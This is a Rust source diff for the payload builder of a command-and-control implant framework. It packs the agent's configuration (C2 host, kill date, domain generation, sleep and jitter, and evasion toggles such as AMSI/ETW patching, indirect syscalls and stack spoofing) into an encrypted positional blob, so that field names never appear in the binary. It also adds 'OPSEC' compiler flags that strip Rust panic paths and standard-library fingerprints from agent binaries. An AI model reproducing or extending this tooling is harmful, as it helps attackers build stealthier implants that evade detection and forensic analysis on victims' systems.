@@ -352,74 +352,96 @@ fn main() -> Result<()> {
         cli.host.clone()
     };
 
-    let fallback_config: serde_json::Value = if let Some(path) = &cli.fallback_file {
+    // Fallback profiles are parsed as the shared FallbackConfig type. The
+    // file format is the field-name-free positional seq (see common.rs):
+    //   [[endpoint, ...], strategy_tag, dead_time_secs]
+    // with endpoint = [host, port, transport_tag, profile, proxy, priority,
+    // weight, max_failures] (trailing elements optional).
+    let fallback_cfg: rcm::common::FallbackConfig = if let Some(path) = &cli.fallback_file {
         println!("[*] Loading Fallback: {}", path);
         let content = fs::read_to_string(path).context("Failed to read fallback file")?;
-        let parsed: serde_json::Value = serde_json::from_str(&content).context("Invalid fallback JSON")?;
-        let ep_count = parsed.get("endpoints").and_then(|e| e.as_array()).map(|a| a.len()).unwrap_or(0);
-        let strategy = parsed.get("strategy").and_then(|s| s.as_str()).unwrap_or("priority");
-        println!("[*] Fallback:     {} endpoints, strategy={}", ep_count, strategy);
+        let parsed: rcm::common::FallbackConfig =
+            serde_json::from_str(&content).context("Invalid fallback JSON (expected positional array format)")?;
+        println!("[*] Fallback:     {} endpoints, strategy={:?}", parsed.endpoints.len(), parsed.strategy);
         parsed
     } else {
-        json!({"endpoints": [], "strategy": "priority", "dead_time_secs": 300})
+        rcm::common::FallbackConfig {
+            endpoints: vec![],
+            strategy: rcm::common::FallbackStrategy::Priority,
+            dead_time_secs: 300,
+        }
     };
 
-    let config_json = json!({
-        "transport": match cli.transport {
-            Transport::Tls       => "tls",
-            Transport::TcpPlain  => "tcp_plain",
-            Transport::NamedPipe => "named_pipe",
-            Transport::Http      => "http",
-            Transport::Https     => "https",
-        },
-        "profile": final_profile,
-        "proxy": { "use_system": true, "url": "", "username": "", "password": "" },
-        "fallback": fallback_config,
-        "c2_host": final_host,
-        "tunnel_port": port_u16,
-        "sleep_interval": cli.sleep,
-        "jitter_min": cli.jitter_min,
-        "jitter_max": cli.jitter_max,
-        "bloat_mb": cli.bloat,
-        "debug": cli.debug,
-        "server_public_key": pub_key_b64,
-        "hash_salt": hash_salt,
-        "build_id": build_id,
-        "kill_date": kill_ts,
-        "challenge_key": challenge_key_b64,
-        "sni_override":   cli.sni_override,
-        "alpn_protocols": cli.alpn_protocols,
-        "hibernation_mode": cli.hibernation,
-        "batch_size":     cli.batch_size,
-        "dga": cli.dga_seed.map(|seed| serde_json::json!({
-            "seed":        seed,
-            "window_secs": cli.dga_window,
-            "count":       cli.dga_count,
-            "tlds":        cli.dga_tlds.split(',').collect::<Vec<_>>()
-        })),
+    // Assemble the config as a POSITIONAL JSON array matching C2Config's
+    // declaration order (transport=0, profile=1, ..., auto_pivot_port=32).
+    // serde_json::from_value then drives the manual seq Deserialize impl,
+    // and the result is packed into the binary blob that gets encrypted.
+    let profile_value = serde_json::to_value(&final_profile)?;
+    let fallback_value = serde_json::to_value(&fallback_cfg)?;
+    let dga_value = cli.dga_seed.map(|seed| json!([
+        seed,
+        cli.dga_window,
+        cli.dga_count,
+        cli.dga_tlds.split(',').collect::<Vec<_>>()
+    ]));
+
+    // Transport tag (Tls=0, TcpPlain=1, NamedPipe=2, Http=3, Https=4)
+    let transport_tag: u8 = match cli.transport {
+        Transport::Tls       => 0,
+        Transport::TcpPlain  => 1,
+        Transport::NamedPipe => 2,
+        Transport::Http      => 3,
+        Transport::Https     => 4,
+    };
+
+    let config_value = json!([
+        transport_tag,          // 0: transport
+        profile_value,          // 1: profile
+        json!([true, "", "", ""]), // 2: proxy (use_system, url, username, password)
+        fallback_value,         // 3: fallback
+        pub_key_b64,            // 4: server_public_key
+        hash_salt,              // 5: hash_salt
+        final_host,             // 6: c2_host
+        build_id,               // 7: build_id
+        port_u16,               // 8: tunnel_port
+        cli.sleep,              // 9: sleep_interval
+        cli.jitter_min,         // 10: jitter_min
+        cli.jitter_max,         // 11: jitter_max
+        cli.bloat,              // 12: bloat_mb
+        cli.debug,              // 13: debug
+        kill_ts,                // 14: kill_date
+        challenge_key_b64,      // 15: challenge_key
+        cli.sni_override,       // 16: sni_override
+        cli.alpn_protocols,     // 17: alpn_protocols
+        cli.hibernation,        // 18: hibernation_mode
+        cli.batch_size,         // 19: task_batch_size
+        dga_value,              // 20: dga
+        Vec::<String>::new(),   // 21: valid_parents (not exposed as a CLI flag)
         // ── Evasion ───────────────────────────────────────────────────
-        "sleep_mask":        cli.sleep_mask,
-        "indirect_syscalls": cli.indirect_syscalls,
-        "stack_spoof":       cli.stack_spoof,
-        "patch_amsi_etw":    cli.patch_amsi_etw,
-        "heap_encrypt":      cli.heap_encrypt,
+        cli.sleep_mask,         // 22: sleep_mask
+        cli.indirect_syscalls,  // 23
+        cli.stack_spoof,        // 24
+        cli.patch_amsi_etw,     // 25
+        cli.heap_encrypt,       // 26
         // ── Execution guardrails ──────────────────────────────────────
-        "guard_domain":      cli.guard_domain,
-        "guard_hostname":    cli.guard_hostname,
-        "guard_hour_start":  guard_hour_start,
-        "guard_hour_end":    guard_hour_end,
-        "guard_no_system":   cli.guard_no_system,
-        // ── Pivot auto-cascade ────────────────────────────────────────
-        // null when not set - the agent's #[serde(default)] treats null
-        // and missing identically, so existing builds are unaffected.
-        "auto_pivot_port":   cli.auto_pivot_port,
-    }).to_string();
+        cli.guard_domain,       // 27
+        cli.guard_hostname,     // 28
+        guard_hour_start,       // 29
+        guard_hour_end,         // 30
+        cli.guard_no_system,    // 31
+        // ── Pivot auto-cascade (null when not set) ────────────────────
+        cli.auto_pivot_port,    // 32
+    ]);
+
+    let config: rcm::common::C2Config = serde_json::from_value(config_value)
+        .context("Internal error: assembled config does not fit the C2Config schema")?;
 
     println!("[*] Encrypting configuration...");
     let key = Aes256Gcm::generate_key(&mut CryptoOsRng);
     let cipher = Aes256Gcm::new(&key);
     let nonce = Aes256Gcm::generate_nonce(&mut CryptoOsRng);
-    let ciphertext = cipher.encrypt(&nonce, config_json.as_bytes())
+    let config_packed = config.pack();
+    let ciphertext = cipher.encrypt(&nonce, config_packed.as_slice())
         .map_err(|e| anyhow::anyhow!("Encryption failed: {}", e))?;
 
     let build_env_json = json!({
@@ -517,12 +539,113 @@ fn main() -> Result<()> {
         cmd.env("RUSTUP_HOME", "/usr/local/rustup");
     }
 
-    // Path remapping for reproducible builds (strips source paths from binary)
+    // ── OPSEC RUSTFLAGS: panic-location stripping ─────────────────────
+    //
+    // Rust panic metadata embeds `file:line:col` for every panic site.
+    // On nightly, `-Zlocation-detail=none` removes line/column info and
+    // `-Ztrim-paths` rewrites all path prefixes (own crate -> `<crate>/`,
+    // registry -> neutral form, sysroot removed), superseding the manual
+    // --remap-path-prefix flags. On stable those flags are rejected, so
+    // fall back to the path remaps and warn loudly that file:line strings
+    // WILL leak into the binary.
     let cargo_home = std::env::var("CARGO_HOME").unwrap_or_else(|_| "/usr/local/cargo".to_string());
-    cmd.env("RUSTFLAGS", format!(
-        "--remap-path-prefix {}=/src --remap-path-prefix {}=/cargo",
-        project_root.display(), cargo_home
-    ));
+
+    // Toolchain detection: rustc lives next to cargo; fall back to PATH.
+    let rustc_bin = cargo_bin.with_file_name("rustc");
+    let rustc_version = Command::new(&rustc_bin)
+        .arg("--version")
+        .output()
+        .or_else(|_| Command::new("rustc").arg("--version").output())
+        .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
+        .unwrap_or_default();
+    let is_nightly = rustc_version.contains("nightly");
+
+    if is_nightly {
+        // Rebuild the standard library from source with the SAME OPSEC flags.
+        //
+        // Without this, the *prebuilt* core/std still fingerprint the binary
+        // as Rust:
+        //   - `/rustc/<commit>/library/{core,std,alloc}/...` panic-location
+        //     paths (location-detail only applies to crates compiled with it,
+        //     and the shipped std was compiled WITHOUT it),
+        //   - std panic message strings: "called `Option::unwrap()` on a
+        //     `None` value", "thread '<name>' panicked at", index/OOB texts,
+        //   - the `RUST_BACKTRACE` env-var name from std's backtrace support.
+        //
+        // -Zbuild-std recompiles std for the agent target so
+        // -Zlocation-detail=none and -Ztrim-paths cover it too;
+        // panic_immediate_abort turns every std panic into an immediate abort
+        // with NO message formatting machinery, so those strings are never
+        // materialized in the binary. Requires the rust-src component.
+        let rustup_bin = find_rustup();
+        let rust_src_ok = Command::new(&rustup_bin)
+            .args(["component", "list", "--installed"])
+            .output()
+            .map(|o| String::from_utf8_lossy(&o.stdout).contains("rust-src"))
+            .unwrap_or(false);
+        if rust_src_ok {
+            println!("[+] OPSEC: rebuilding std with panic_immediate_abort (Rust fingerprints removed)");
+            cmd.args([
+                "-Zbuild-std=std,panic_abort",
+                "-Zbuild-std-features=panic_immediate_abort",
+            ]);
+        } else {
+            println!("[!] ============================================================");
+            println!("[!] WARNING: rust-src component not installed.");
+            println!("[!] The prebuilt std will leak Rust fingerprints:");
+            println!("[!]   /rustc/<hash>/library/... paths, unwrap/panic messages,");
+            println!("[!]   RUST_BACKTRACE. Install it: rustup component add rust-src");
+            println!("[!] ============================================================");
+        }
+    }
+
+    let opsec_flags = if is_nightly {
+        println!("[+] OPSEC: panic locations stripped (nightly)");
+        "-Zlocation-detail=none -Ztrim-paths".to_string()
+    } else {
+        println!("[!] ============================================================");
+        println!("[!] WARNING: stable toolchain detected ('{}').", rustc_version.trim());
+        println!("[!] Panic file:line strings WILL leak into the agent binary.");
+        println!("[!] Use a nightly toolchain for -Zlocation-detail=none -Ztrim-paths.");
+        println!("[!] ============================================================");
+        format!(
+            "--remap-path-prefix {}=/src --remap-path-prefix {}=/cargo",
+            project_root.display(), cargo_home
+        )
+    };
+
+    // Cargo uses exactly one rustflags source: the env RUSTFLAGS set here
+    // SHADOWS the `[target.x86_64-pc-windows-gnu] rustflags` static-link flags
+    // in .cargo/config.toml. Re-include them for the MinGW target or the agent
+    // ends up depending on mingw runtime DLLs on the target host.
+    let target_flags = if target == "x86_64-pc-windows-gnu" {
+        // RUSTFLAGS is whitespace-split by cargo, so each flag must be a
+        // single token: -C link-arg=<x> (singular) — NOT
+        // `-C link-args=-static -static-libgcc ...`, whose space-separated
+        // tail would be misparsed as rustc options ("Unrecognized option: 's'").
+        " -C link-arg=-static -C link-arg=-static-libgcc -C link-arg=-static-libstdc++"
+    } else {
+        ""
+    };
+
+    // Every build through this path is an AGENT binary (client, client_dll,
+    // client_service, stager) - the server and builder itself are compiled
+    // separately without these flags. --cfg agent_build compiles the typed
+    // config tree (src/config.rs) down to struct definitions + embedded
+    // defaults: no TOML parser, no derived serde Deserialize impls, and none
+    // of the ~82 field-name strings leak into the agent binary. The
+    // --check-cfg registers the custom cfg so the unexpected_cfgs lint stays
+    // quiet (mirrored in Cargo.toml [lints.rust] for plain `cargo check`).
+    let agent_cfg_flags = " --cfg agent_build --check-cfg=cfg(agent_build)";
+
+    // Preserve operator-provided RUSTFLAGS by appending, not overwriting.
+    let rustflags = match std::env::var("RUSTFLAGS") {
+        Ok(existing) if !existing.trim().is_empty() => {
+            format!("{} {}{}{}", existing, opsec_flags, target_flags, agent_cfg_flags)
+        }
+        _ => format!("{}{}{}", opsec_flags, target_flags, agent_cfg_flags),
+    };
+    cmd.env("RUSTFLAGS", rustflags);
 
     let status = cmd.status().context(
         "Failed to spawn cargo. Verify that cargo is installed and accessible."
